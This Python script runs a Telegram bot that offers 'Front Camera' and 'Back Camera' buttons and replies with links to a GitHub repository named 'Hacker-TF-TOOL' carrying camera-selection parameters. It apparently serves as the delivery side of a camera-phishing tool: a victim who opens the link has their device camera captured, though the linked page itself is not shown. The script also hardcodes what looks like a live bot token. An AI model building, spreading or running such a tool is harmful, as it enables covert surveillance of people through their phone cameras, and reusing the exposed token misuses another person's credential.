from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Updater, CommandHandler, CallbackQueryHandler, CallbackContext

# 🔑 Bot Token aur GitHub Pages links
TOKEN = '7593575018:AAHNy45AArCI3VrxMnZltDt69RfzHLpzZb0'
FRONT_CAMERA_LINK = 'https://github.com/tahiriqbal756/Hacker-TF-TOOL.com/tree/main?camera=user'
BACK_CAMERA_LINK = 'https://github.com/tahiriqbal756/Hacker-TF-TOOL.com/tree/main?camera=environment'

# 🎛 Start Command: Buttons dikhata hai
def start(update: Update, context: CallbackContext):
    keyboard = [
        [InlineKeyboardButton("📸 Front Camera", callback_data='front')],
        [InlineKeyboardButton("📸 Back Camera", callback_data='back')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    update.message.reply_text('Choose Camera:', reply_markup=reply_markup)

# 📲 Button Click Handler: Link bhejta hai
def button_click(update: Update, context: CallbackContext):
    query = update.callback_query
    query.answer()

    if query.data == 'front':
        query.edit_message_text(text=f"Open this link for 📸 **Front Camera:**\n{FRONT_CAMERA_LINK}")
    elif query.data == 'back':
        query.edit_message_text(text=f"Open this link for 📸 **Back Camera:**\n{BACK_CAMERA_LINK}")

# 🤖 Bot Setup
updater = Updater(TOKEN)
updater.dispatcher.add_handler(CommandHandler('start', start))
updater.dispatcher.add_handler(CallbackQueryHandler(button_click))

print("🤖 Bot is running...")
updater.start_polling()
updater.idle()
